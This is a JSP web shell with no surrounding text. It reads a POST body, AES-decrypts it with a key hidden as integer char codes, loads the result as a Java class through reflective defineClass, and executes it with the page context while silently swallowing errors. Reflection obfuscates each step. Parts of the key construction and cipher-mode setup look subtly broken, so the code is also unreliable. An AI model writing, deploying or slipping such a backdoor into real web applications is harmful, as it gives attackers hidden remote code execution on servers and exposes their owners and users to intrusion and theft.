<%@page import="java.lang.reflect.*"%><%!
Object a(String b, Object... c) throws Exception {
    return Class.forName(b).getMethod("get" + (b.endsWith("64") ? "Decoder" : "Instance"), 
        b.endsWith("64") ? null : new Class[]{String.class})
        .invoke(null, b.endsWith("64") ? null : c[0]);
}
Object b(Object d, String e, Class[] f, Object... g) throws Exception {
    return d.getClass().getMethod(e, f).invoke(d, g);
}
%><%
try {
    if (!"POST".equals(request.getMethod())) return;

    char[] k = new char[16];
    int[] x = {101,52,53,101,51,50,57,102,101,98,53,100,57,50,53,98};
    for (int i = 0; i < 16; i++) k[i] = (char)x[i];

    String data = request.getReader().readLine();
    Object dec = a("java.util.Base64");
    byte[] enc = (byte[]) b(dec, "decode", new Class[]{String.class}, data);

    Object c = a("javax.crypto.Cipher", "AES");
    Object key = java.security.Key.class.cast(
        java.lang.reflect.Array.newInstance(Byte.TYPE, 0).getClass().getComponentType()
        .getConstructor(byte[].class).newInstance(new Object[]{new String(k).getBytes("UTF-8")})
    );
    int mode = Integer.valueOf(System.getProperty("sun.arch.data.model", "2"));
    b(c, "init", new Class[]{int.class, java.security.Key.class}, mode, key);
    byte[] raw = (byte[]) b(c, "doFinal", new Class[]{byte[].class}, enc);

    ClassLoader cl = new ClassLoader() {
        protected Class<?> findClass(String name) throws ClassNotFoundException {
            return null;
        }
    };
    Method m = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
    m.setAccessible(true);
    Class<?> payload = (Class<?>) m.invoke(cl, (String)null, raw, 0, raw.length);
    
    payload.getMethod("equals", Object.class).invoke(payload.newInstance(), pageContext);
    
} catch (Throwable t) {}
%>
